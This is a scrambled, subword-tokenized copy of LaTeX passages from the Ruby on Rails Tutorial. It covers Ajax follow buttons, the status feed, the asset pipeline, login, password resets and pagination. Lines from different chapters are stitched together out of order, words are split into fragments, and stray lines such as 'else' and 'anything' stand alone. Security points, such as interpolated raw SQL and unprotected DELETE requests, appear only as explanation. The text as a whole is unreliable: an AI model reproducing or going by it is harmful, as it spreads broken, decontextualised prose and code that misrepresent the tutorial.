▁This ▁uses ▁the ▁\ k ode { xhr } ▁method ▁( for ▁`` X m l Http Request '') ▁to ▁issue ▁an ▁Ajax ▁request ; ▁compare ▁to ▁the ▁\ k ode { get }, ▁\ k ode { post }, ▁\ k ode { patch }, ▁and ▁\ k ode { delete } ▁methods ▁used ▁in ▁previous ▁tests .
▁We ▁the n ▁verify ▁that ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁do ▁the ▁correct ▁things ▁when ▁hit ▁with ▁an ▁Ajax ▁request .
▁( To ▁write ▁more ▁ th or ough ▁test ▁suite s ▁for ▁Ajax - h e a v y ▁applications , ▁take ▁a ▁look ▁at ▁\ href { http :// s el en i um h q . org /}{ S el en i um } ▁and ▁\ href { http :// w at ir . com /}{ W at ir }. )
▁Tests ▁for ▁the ▁Relationship s ▁controller ▁response s ▁to ▁Ajax ▁requests .
▁( In ▁fact , ▁the ▁\ href { http :// railstutorial . org }{ Ruby ▁on ▁Rails ▁Tutorial ▁site } ▁live s ▁at ▁Heroku ; ▁if ▁you ' re ▁reading ▁this ▁book ▁online , ▁you ' re ▁look ing ▁at ▁a ▁Heroku - host ed ▁site ▁right ▁now ! )
▁I ' m ▁learning ▁Ruby ▁on ▁Rails ▁with ▁@ railstutorial !
▁All ▁that ' s ▁left ▁is ▁to ▁actually ▁start ▁learning ▁Rails !
▁Let ' s ▁get ▁to ▁it .
▁In ▁this ▁case , ▁though , ▁the ▁\ k ode { xhr } ▁method ▁is ▁( some what ▁in ex p li c ably ) ▁not ▁available ▁in ▁integration ▁tests .
▁A lthough ▁our ▁use ▁of ▁\ k ode { xhr } ▁is ▁new , ▁at ▁this ▁point ▁in ▁the ▁tutorial ▁you ▁should ▁be ▁able ▁to ▁infer ▁from ▁context ▁what ▁the ▁code ▁does :
▁We ▁see ▁that ▁\ k ode { xhr } ▁take s ▁as ▁arguments ▁a ▁symbol ▁for ▁the ▁relevant ▁HTTP ▁method , ▁a ▁symbol ▁for ▁the ▁action , ▁and ▁a ▁hash ▁represent ing ▁the ▁contents ▁of ▁\ k ode { params } ▁in ▁the ▁controller ▁itself .
▁As ▁in ▁previous ▁examples , ▁we ▁use ▁\ k ode { ex p ec t } ▁to ▁wrap ▁the ▁operation ▁in ▁a ▁block ▁and ▁test ▁for ▁an ▁increment ▁or ▁d ec re ment ▁in ▁the ▁relevant ▁count .
▁As ▁implie d ▁by ▁the ▁tests , ▁the ▁application ▁code ▁uses ▁the ▁same ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁to ▁respond ▁to ▁the ▁Ajax ▁requests ▁that ▁it ▁uses ▁to ▁respond ▁to ▁ordinar y ▁\ text tt { POST } ▁and ▁\ text tt { DELETE } ▁HTTP ▁requests .
▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax }.
▁This ▁code ▁uses ▁\ k ode { respond \_ to } ▁to ▁take ▁the ▁appropriate ▁action ▁depending ▁on ▁the ▁kind ▁of ▁request .
▁( The re ▁is ▁no ▁relationship ▁between ▁this ▁\ k ode { respond \_ to } ▁and ▁the ▁\ k ode { respond \_ to } ▁used ▁in ▁the ▁RSpec ▁examples .)
▁The ▁syntax ▁is ▁ potentially ▁confusing , ▁and ▁it ' s ▁important ▁to ▁understand ▁that ▁in
▁only ▁\ emph { one } ▁of ▁the ▁lines ▁get s ▁executed ▁( base d ▁on ▁the ▁nature ▁of ▁the ▁request ).
▁In ▁the ▁case ▁of ▁an ▁Ajax ▁request , ▁Rails ▁automatically ▁calls ▁a ▁\ emph { JavaScript ▁ Embedded ▁Ruby } ▁(\ k ode { . js . erb }) ▁file ▁with ▁the ▁same ▁name ▁as ▁the ▁action , ▁i . e . , ▁\ k ode { create . js . erb } ▁or ▁\ k ode { destroy . js . erb }.
▁As ▁you ▁m ight ▁guess , ▁the ▁files ▁allow ▁us ▁to ▁mix ▁JavaScript ▁and ▁ Embedded ▁Ruby ▁to ▁perform ▁actions ▁on ▁the ▁current ▁page .
▁The ▁jQuery ▁library ▁provides ▁a ▁large ▁number ▁of ▁methods ▁for ▁m anipulating ▁the ▁DOM , ▁but ▁here ▁we ▁will ▁need ▁only ▁two .
▁Un like ▁plain ▁JavaScript ▁files , ▁ JS - ER b ▁files ▁also ▁allow ▁the ▁use ▁of ▁ Embedded ▁Ruby , ▁which ▁we ▁apply ▁in ▁the ▁\ k ode { create . js . erb } ▁file ▁to ▁update ▁the ▁follow ▁form ▁with ▁the ▁\ k ode { unfollow } ▁partial ▁( which ▁is ▁what ▁should ▁show ▁after ▁a ▁successful ▁following ) ▁and ▁update ▁the ▁follower ▁count .
▁This ▁uses ▁the ▁\ k ode { escape \_ javascript } ▁function , ▁which ▁is ▁needed ▁to ▁escape ▁out ▁the ▁result ▁when ▁insert ing ▁HTML ▁in ▁a ▁JavaScript ▁file .
▁The ▁JavaScript ▁ Embedded ▁Ruby ▁to ▁create ▁a ▁following ▁relationship .
▁With ▁that , ▁you ▁should ▁navigate ▁to ▁a ▁user ▁profile ▁page ▁and ▁verify ▁that ▁you ▁can ▁follow ▁and ▁unfollow ▁without ▁a ▁page ▁refresh , ▁and ▁the ▁test ▁suite ▁should ▁also ▁pass :
▁Using ▁Ajax ▁in ▁Rails ▁is ▁a ▁large ▁and ▁ fa st - m o v ing ▁subject , ▁so ▁we ' ve ▁only ▁been ▁able ▁to ▁scratch ▁the ▁ s ur fa ce ▁here , ▁but ▁( as ▁with ▁the ▁rest ▁of ▁the ▁material ▁in ▁this ▁tutorial ) ▁our ▁treat ment ▁should ▁give ▁you ▁a ▁good ▁foundation ▁for ▁more ▁advanced ▁resources .
▁To ▁accomplish ▁this ▁f e at , ▁we ▁will ▁need ▁some ▁fai r ly ▁advanced ▁Rails , ▁Ruby , ▁and ▁even ▁SQL ▁programming ▁technique s .
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed . ~\ href { http :// railstutorial . org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁as ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ spec s }.
▁The ▁final ▁tests ▁for ▁the ▁status ▁feed .
▁We ▁can ▁use ▁the ▁above ▁method ▁to ▁construct ▁the ▁necessary ▁array ▁of ▁followed ▁user ▁id s ▁by ▁calling ~\ k ode { id } ▁on ▁each ▁element ▁in ▁\ k ode { user . followed \_ users }.
▁At ▁this ▁point , ▁you ▁m ight ▁guess ▁that ▁code ▁like
▁Note ▁that , ▁because ▁it ▁is ▁now ▁raw ▁SQL , ▁\ k ode { followed \_ user \_ id s } ▁is ▁\ emph { in ter p olated }, ▁not ▁escape d .
▁WHERE ▁follower _ id ▁= ▁: user _ id "
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed . ~\ href { http :// railstutorial . org / images / figures / home _ page _ with _ feed _ bootstrap - full . png }{ ( full ▁size )}
▁This ▁application ▁includes ▁examples ▁of ▁all ▁the ▁major ▁features ▁of ▁Rails , ▁including ▁models , ▁views , ▁controllers , ▁templates , ▁partials , ▁filter s , ▁validations , ▁callbacks , ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁and ▁\ k ode { has \_ many ▁through } ▁associations , ▁security , ▁testing , ▁and ▁deployment .
▁\ href { http :// railstutorial . org / screencasts }{ The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁screencasts } : ▁I ▁have ▁prepared ▁a ▁full - length ▁screencast ▁course ▁base d ▁on ▁this ▁book .
▁They ▁are ▁available ▁for ▁purchas e ▁through ▁the ▁\ href { http :// railstutorial . org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁website }.
▁Ruby ▁and ▁Rails ▁book s : ▁I ▁recommend ▁\ href { http :// www . a mazon . com / g p / product /1 4 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P e ter ▁Co o p er , ▁\ href { http :// www . a mazon . com / g p / product / 19 3 39 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A . ▁B la c k , ▁\ href { http :// www . a mazon . com / Eloquent - Ruby - A d d is on - We s le y - P rofessional - Seri es / d p / 0 3 2 1 58 4 10 4 / }{\ emph { Eloquent ▁Ruby } } ▁by ▁R us s ▁O l s en , ▁and ▁\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n ▁for ▁further ▁Ruby ▁learning , ▁and ▁\ href { http :// www . a mazon . com / g p / product / 0 3 2 16 0 16 6 1 }{\ emph { The ▁Rails ~3 ▁Way } } ▁by ▁O b i e ▁F er n and e z ▁and ▁\ emph { Rails ~3 ▁in ▁Action } ▁( w a it ▁for ▁the ▁second ▁edition ) ▁by ▁ Ryan ▁B ig g ▁and ▁ Y e h u d a ▁ K at z ▁for ▁more ▁about ▁Rails .
▁\ href { http :// p eep code . com /}{ PeepCode } ▁and ▁\ href { http :// code school . com /}{ C ode ▁School } : ▁The ▁screencasts ▁at ▁ PeepCode ▁and ▁interactive ▁course s ▁at ▁Code ▁School ▁are ▁consistent ly ▁high - quality , ▁and ▁I ▁ w ar m ly ▁recommend ▁them .
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁For ▁our ▁purposes , ▁the ▁`` start er '' ▁ti er ▁( which ▁is ▁ limited ▁to ▁200 ▁email s ▁a ▁day ▁but ▁co st s ▁nothing ) ▁is ▁the ▁best ▁fit .
▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ preview }.
▁This ▁involve s ▁open ing ▁the ▁\ k ode { Gemfile } ▁with ▁a ▁text ▁editor .
▁Convert ing ▁the ▁\ k ode { Gemfile } ▁in ▁Listing ~\ ref { code : default _ gemfile } ▁to ▁use ▁exact ▁gem ▁versions ▁results ▁in ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version }.
▁On ce ▁you ' ve ▁placed ▁the ▁contents ▁of ▁Listing ~\ ref { code : gemfile _ sqlite _ version } ▁into ▁the ▁application ' s ▁\ k ode { Gemfile }, ▁install ▁the ▁gems ▁using ▁\ k ode { bundle ▁install }
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 . be t a 1 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁The ▁raw ▁home ▁view ▁(\ href { http ://0.0.0.0:3000/ static _ pages / home }{/ static \_ pages / home }).
▁The ▁new ▁About ▁page ▁(\ href { http ://0.0.0.0:3000/ static _ pages / about }{/ static \_ pages / about }).
▁in ▁Listing ~\ ref { code : title _ tests }.
▁The ▁result ▁is ▁show n ▁in ▁F igure ~\ ref { fig : home _ root _ route }.
▁( In ▁fact , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : demo _ users _ resource } ▁and ▁Section ~\ ref { sec : microposts _ resource }, ▁\ k ode { rails ▁generate } ▁can ▁make ▁automatic ▁edit s ▁to ▁the ▁\ k ode { routes . rb } ▁file , ▁which ▁we ▁also ▁want ▁to ▁undo ▁automatically .)
▁With ▁the ▁status ▁feed ▁design ▁requirements ▁capture d ▁in ▁the ▁test ▁from ▁Listing ~\ ref { code : full _ feed _ test }, ▁we ' re ▁ready ▁to ▁start ▁writing ▁the ▁feed .
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁proto - feed ▁( F igure ~\ ref { fig : home _ with _ proto _ feed _ 3 r d _ edit ion }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final } ▁as ▁seen ▁in ▁F igure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁Let ' s ▁start ▁explor ing ▁strings ▁with ▁the ▁console , ▁this ▁time ▁started ▁with ▁\ k ode { rails ~ c }, ▁which ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁console } :
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁F igure ~\ ref { fig : edit or _ s hel l }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁80 ▁characters .
▁You ' re ▁now ▁in ▁a ▁position ▁to ▁app re ci ate , ▁at ▁least ▁ v a g ue ly , ▁what ▁this ▁code ▁means : ▁\ k ode { StaticPages Controller } ▁is ▁a ▁class ▁that ▁inherit s ▁from ▁\ k ode { Application Controller }, ▁and ▁comes ▁equip ped ▁with ▁\ k ode { home }, ▁\ k ode { help }, ▁and ▁\ k ode { about } ▁methods .
▁We ▁see ▁from ▁the ▁\ k ode { class } ▁keyword ▁in ▁Listing ~\ ref { code : static _ pages _ controller } ▁that ▁\ k ode { static \_ pages \_ controller . rb } ▁defines ▁a ▁\ emph { class }, ▁in ▁this ▁case ▁called ▁\ k ode { StaticPages Controller }.
▁As ▁describe d ▁in ▁Section ~\ ref { sec : generated _ static _ pages }, ▁an ▁action ▁called ▁\ k ode { home } ▁is ▁ associated ▁with ▁a ▁view ▁called ▁\ k ode { home . html . erb } ▁located ▁in ▁the ▁\ k ode { app / views / static \_ pages } ▁directory , ▁which ▁means ▁that ▁we ▁need ▁to ▁create ▁a ▁new ▁file ▁called ▁\ k ode { about . html . erb } ▁in ▁the ▁same ▁directory .
▁# ▁Create ▁the ▁token .
▁All ▁methods ▁defined ▁in ▁a ▁class ▁after ▁\ k ode { private } ▁are ▁automatically ▁hidden , ▁so ▁that
▁in ▁Listing ~\ ref { code : before _ create _ activation _ digest }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action }.
▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration }.
▁in ▁Listing ~\ ref { code : prev ent ing _ un activated _ login s }.
▁else
▁as ▁seen ▁in ▁Listing ~\ ref { code : log _ in _ password _ resets } ▁and ▁F igure ~\ ref { fig : forgot _ password _ link }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ migration }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ form }.
▁in ▁Listing ~\ ref { code : password _ resets _ integration _ test }.
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : password _ resets _ integration _ test }, ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁In ▁this ▁case , ▁it ' s ▁easy ▁to ▁write ▁a ▁short ▁test ▁for ▁the ▁User ▁model , ▁in ▁which ▁we ▁use ▁\ k ode { following ? }
▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ access _ control }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests }.
▁The ▁user ▁index ▁view .
▁CSS ▁for ▁the ▁user ▁index .
▁Of ▁course , ▁to ▁create ▁enough ▁users ▁to ▁make ▁a ▁d ec ent ▁user ▁index , ▁we ▁\ emph { co ul d } ▁use ▁our ▁web ▁browser ▁to ▁visit ▁the ▁signup ▁page ▁and ▁make ▁the ▁new ▁users ▁one ▁by ▁one , ▁but ▁far ▁a ▁better ▁solution ▁is ▁to ▁use ▁Ruby ▁( and ▁Rake ) ▁to ▁make ▁the ▁users ▁for ▁us .
▁The ▁user ▁index ▁with ▁pagination .
▁So , ▁for ▁example , ▁page ~ 1 ▁is ▁users ▁1 - -30 , ▁page ~ 2 ▁is ▁users ▁31 - - 60 , ▁etc . ▁If ▁the ▁page ▁is ▁\ k ode { nil }, ▁\ k ode { paginate } ▁simply ▁returns ▁the ▁first ▁page .
▁Here ▁the ▁\ k ode { : page } ▁parameter ▁comes ▁from ▁\ k ode { params [: page ]} , ▁which ▁is ▁generated ▁automatically ▁by ▁\ k ode { will \_ paginate }.
▁The ▁ paginate d ▁user ▁index ▁is ▁now ▁complete , ▁but ▁there ' s ▁one ▁improve ment ▁I ▁can ' t ▁re s ist ▁including : ▁Rails ▁has ▁some ▁in credibly ▁ s li c k ▁tool s ▁for ▁making ▁compact ▁views , ▁and ▁in ▁this ▁section ▁we ' ll ▁refactor ▁the ▁index ▁page ▁to ▁use ▁them .
▁The ▁fully ▁ refactored ▁user ▁index .
▁Now ▁that ▁the ▁user ▁index ▁is ▁complete , ▁there ' s ▁only ▁one ▁canonical ▁REST ▁action ▁left : ▁\ k ode { destroy }.
▁F inally , ▁we ▁ migrate ▁the ▁development ▁database ▁and ▁ prepare ▁the ▁test ▁database :
▁This ▁request ▁would ▁make ▁user ▁ 17 ▁an ▁admin , ▁which ▁would ▁be ▁a ▁ potentially ▁serious ▁security ▁ br each , ▁to ▁say ▁the ▁least .
▁We ' ll ▁start ▁by ▁adding ▁a ▁delete ▁link ▁for ▁each ▁user ▁on ▁the ▁user ▁index ▁page , ▁restrict ing ▁access ▁to ▁ administrative ▁users .
▁If ▁you ▁must ▁support ▁non - JavaScript - en able d ▁browsers ▁you ▁can ▁fake ▁a ▁\ text tt { DELETE } ▁request ▁using ▁a ▁form ▁and ▁a ▁\ text tt { POST } ▁request , ▁which ▁works ▁even ▁without ▁JavaScript ; ▁see ▁the ▁ RailsCast ▁on ▁`` \ href { http :// r ailscasts . com / episodes / 7 7 - destroy - with out - javascript }{ Destroy ▁With out ▁JavaScript } '' ▁for ▁details .
▁as ▁seen ▁in ▁Listing ~\ ref { code : destroy _ action }.
▁As ▁construct ed , ▁only ▁admin s ▁can ▁destroy ▁users ▁through ▁the ▁web , ▁because ▁only ▁admin s ▁can ▁see ▁the ▁delete ▁links .
▁U nfortunately , ▁there ' s ▁ still ▁a ▁terribl e ▁security ▁hole : ▁any ▁ s u ff ic i ent ly ▁sophisticat ed ▁attacker ▁could ▁simply ▁issue ▁\ text tt { DELETE } ▁requests ▁directly ▁from ▁the ▁command ▁line ▁to ▁delete ▁any ▁user ▁on ▁the ▁site .
▁If ▁you ▁ still ▁find ▁this ▁tutorial ▁too ▁difficult , ▁you ▁m ight ▁try ▁starting ▁with ▁\ href { http :// learn - rails . com / }{\ emph { Learn ▁Ruby ▁on ▁Rails } } ▁by ▁D an i el ▁ K e h o e ▁or ▁\ href { http :// m b s y . co / 7 Z d c 7 }{ O n e ▁Mon th ▁Rails }, ▁both ▁of ▁which ▁are ▁gear ed ▁more ▁toward ▁complete ▁beginners ▁than ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }.
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following }, ▁our ▁user ▁interface ▁won ' t ▁allow ▁this ▁to ▁happen , ▁but ▁adding ▁a ▁unique ▁index ▁arrange s ▁to ▁raise ▁an ▁error ▁if ▁a ▁user ▁ tries ▁to ▁create ▁duplicate ▁relationships ▁any way ▁( for ▁example , ▁by ▁using ▁a ▁command - line ▁tool ▁such ▁as ▁\ text tt { curl }).
▁following
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { http :// en . wiki p edia . org / wiki / S N A F U }{ s n a f us }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : install ing _ rails }.
▁Thus , ▁we ▁have ▁\ k ode { User } ▁instead ▁\ k ode { Users }.
▁To ▁implement ▁the ▁forwarding ▁behavior ▁show n ▁in ▁F igure ~\ ref { fig : login _ page _ protected _ mockup _ bootstrap }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁in ▁Listing ~\ ref { code : account _ activation _ and _ password _ resets }.
▁from ▁Listing ~\ ref { code : test _ helper _ log _ in } ▁to
▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : correct _ user _ before _ filter }.
▁This ▁evaluate s ▁to ▁\ k ode { session [: return \_ to ]} ▁unless ▁it ' s ▁\ k ode { nil }, ▁in ▁which ▁case ▁it ▁evaluate s ▁to ▁the ▁given ▁default ▁URL .
▁The ▁first ▁line ▁here ▁pull s ▁the ▁user ▁out ▁of ▁the ▁database ▁using ▁the ▁submitted ▁email ▁address .
▁In ▁this ▁case , ▁though , ▁such ▁a ▁test ▁involve s ▁sever al ▁new ▁idea s , ▁so ▁for ▁now ▁it ' s ▁best ▁def er r ed ▁to ▁its ▁own ▁section ▁( Section ~\ ref { sec : layout _ link _ tests }).
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ sessions }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }.
▁in ▁Listing ~\ ref { code : remember _ test }.
▁anything
▁T h ough ▁it ▁must ▁be ▁used ▁with ▁caution , ▁the ▁flexibility ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁allows ▁for ▁extra or dinarily ▁natural ▁addition s ▁to ▁plain ▁Ruby .
▁After ▁the ▁cookie ▁is ▁set , ▁on ▁subsequent ▁page ▁views ▁we ▁can ▁retrieve ▁the ▁user ▁with ▁code ▁like
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ with _ remember }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : forget _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ forget }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ raise }.
▁in ▁Listing ~\ ref { code : persistent _ sessions _ test }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ out _ with _ test _ close _ browser }
▁in ▁Listing ~\ ref { code : test _ close _ browser }.
▁ NoMethodError : ▁You ▁have ▁a ▁nil ▁object ▁when ▁you ▁did n ' t ▁expect ▁it !
▁You ▁m ight ▁have ▁expected ▁an ▁instance ▁of ▁ Array .
▁The ▁error ▁occur r ed ▁while ▁evaluat ing ▁nil . empty ?
▁=> ▁[" User "]
▁We ' ll ▁the n ▁complete ▁user ▁login ▁in ▁Section ~\ ref { sec : login _ success } ▁by ▁adding ▁the ▁necessary ▁session - manipulati on ▁code .
▁Then ▁we ' ll ▁ la y ▁the ▁foundation ▁for ▁successful ▁login ▁( Section ~\ ref { sec : login _ success }) ▁by ▁evaluat ing ▁each ▁login ▁submission ▁base d ▁on ▁the ▁validity ▁of ▁its ▁email / password ▁combination .
▁in ▁Listing ~\ ref { code : nested _ hashes }.
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁sequence ▁show n ▁in ▁F igure ~\ ref { fig : failed _ login _ flash _ 3 r d _ edit ion } ▁and ▁F igure ~\ ref { fig : flash _ persistence _ 3 r d _ edit ion }.
▁With ▁the ▁\ k ode { create } ▁action ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁the ▁login ▁form ▁defined ▁in ▁Listing ~\ ref { code : login _ form _ tag } ▁should ▁now ▁be ▁working .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : test _ helper _ digest }
▁With ▁the ▁\ k ode { digest } ▁method ▁from ▁Listing ~\ ref { code : test _ helper _ digest }, ▁we ▁are ▁now ▁ready ▁to ▁create ▁a ▁user ▁fixture ▁for ▁a ▁valid ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : re al _ user _ fixture }.
▁from ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁to
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : login _ after _ signup _ test }
▁x ▁= ▁x ▁ + ▁1
▁x ▁ + = ▁1
▁ $ ▁rails ▁console
▁ >> ▁x ▁= ▁1
▁=> ▁1
▁ >> ▁x ▁ + = ▁1
▁=> ▁2
▁ >> ▁x ▁* = ▁3
▁=> ▁6
▁=> ▁- 1
▁=> ▁nil
▁x ▁= ▁x ▁ + ▁1
▁x ▁ + = ▁1
▁ >> ▁1. year . from _ now
▁ >> ▁10 . week s . ago
▁ >> ▁1. k i lo by t e
▁=> ▁10 2 4
▁ >> ▁5 . me g a by t es
▁=> ▁5 2 4 2 88 0
▁Through out ▁the ▁rest ▁of ▁this ▁chapter , ▁you ▁m ight ▁find ▁it ▁helpful ▁to ▁consult ▁the ▁\ href { http :// ruby - doc . org / core - 2 . 0 /}{ Ruby ▁API }. ▁It ' s ▁p ac k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁p ac k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁As ▁discuss ed ▁in ▁more ▁depth ▁in ▁Section ~\ ref { sec : comments _ for _ various _ reader s }, ▁web ▁development ▁is ▁a ▁challenging ▁subject , ▁es pecially ▁for ▁complete ▁beginners .
▁T hanks ▁to ▁reader ▁\ href { https :// twitter . com / c ol m t u ite }{ C ol m ▁T u ite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁Bootstrap .
▁We ' ll ▁end ▁by ▁tak ing ▁a ▁first ▁important ▁step ▁toward ▁let ting ▁users ▁sign ▁up ▁to ▁our ▁site .
▁(\ emph { Note : } ▁it ' s ▁not ▁( y et ) ▁very ▁gra t ify ing .)
▁In ▁the ▁\ k ode { div } ▁tag , ▁the ▁\ k ode { h er o - unit } ▁CSS ▁class ▁has ▁a ▁special ▁meaning ▁to ▁Bootstrap , ▁as ▁do ▁the ▁\ k ode { b t n }, ▁\ k ode { b t n - large }, ▁and ▁\ k ode { b t n - primary } ▁classes ▁in ▁the ▁signup ▁button .
▁by ▁ Michael ▁Hartl
▁One ▁of ▁the ▁most ▁not able ▁addition s ▁in ▁ recent ▁versions ▁of ▁Rails ▁is ▁the ▁asset ▁pipeline , ▁which ▁significant ly ▁improve s ▁the ▁production ▁and ▁manage ment ▁of ▁static ▁assets ▁such ▁as ▁CSS , ▁JavaScript , ▁and ▁images .
▁This ▁section ▁gives ▁a ▁high - level ▁ overview ▁of ▁the ▁asset ▁pipeline ▁and ▁the n ▁shows ▁how ▁to ▁use ▁a ▁re m ar k able ▁tool ▁for ▁making ▁CSS ▁called ▁\ emph { S as s }, ▁now ▁included ▁by ▁default ▁as ▁part ▁of ▁the ▁asset ▁pipeline .
▁< n > ▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁< n > ▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies .
▁< n > ▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁< n > ▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁< n > ▁* ▁scope .
▁Whi le ▁convenient ▁for ▁the ▁programmer , ▁this ▁is ▁in efficient ▁in ▁production ; ▁including ▁multiple ▁full - size d ▁files ▁can ▁significant ly ▁ s low ▁page - load ▁time s ▁( one ▁of ▁the ▁most ▁important ▁factor s ▁a ffect ing ▁the ▁ quality ▁of ▁the ▁user ▁experience ).
▁With ▁the ▁asset ▁pipeline , ▁in ▁production ▁all ▁the ▁application ▁stylesheets ▁get ▁roll ed ▁into ▁one ▁CSS ▁file ▁(\ k ode { application . css }), ▁all ▁the ▁application ▁JavaScript ▁code ▁get s ▁roll ed ▁into ▁one ▁JavaScript ▁file ▁(\ k ode { javascripts . js }), ▁and ▁all ▁such ▁files ▁( including ▁those ▁in ▁\ k ode { lib / assets } ▁and ▁\ k ode { vendor / assets }) ▁are ▁\ emph { mini fi ed } ▁to ▁remove ▁the ▁unnecessary ▁whitespace ▁that ▁ blo at s ▁file ▁size .
▁As ▁a ▁result , ▁we ▁get ▁the ▁best ▁of ▁both ▁world s : ▁multiple ▁nicely ▁ formatted ▁files ▁for ▁programmer ▁convenience , ▁with ▁single ▁optimized ▁files ▁in ▁production .
▁We ' ll ▁implement ▁all ▁but ▁the ▁last ▁one ▁by ▁the ▁end ▁of ▁this ▁chapter .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : sign _ in _ sign _ out }. )
▁/ signin
▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ footer }.
▁< n > ▁Contact ▁Ruby ▁on ▁Rails ▁Tutorial ▁about ▁the ▁sample ▁app ▁at ▁the
▁Now ▁make ▁sure ▁that ▁the ▁tests ▁pass :
▁In ▁other ▁words , ▁we ▁change
▁and ▁so ▁on ▁for ▁the ▁other ▁pages .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : route _ tests }
▁Tests ▁for ▁the ▁named ▁routes .
▁As ▁usual , ▁you ▁should ▁check ▁that ▁the ▁tests ▁are ▁now ▁re d :
▁ Adding ▁a ▁mapping ▁for ▁the ▁root ▁route .
▁The ▁ success or ▁to ▁\ emph { We br at }, ▁Capybara ▁is ▁named ▁after ▁the ▁world ' s ▁\ href { http :// en . wiki p edia . org / wiki / C ap y bar a }{ large st ▁ r ode n t }.
▁" H el p "
▁You ▁may ▁have ▁notice d ▁that ▁our ▁tests ▁for ▁the ▁layout ▁links ▁test ▁the ▁routing ▁but ▁don ' t ▁actually ▁check ▁that ▁the ▁links ▁on ▁the ▁layout ▁go ▁to ▁the ▁right ▁pages .
▁as ▁show n ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests }.
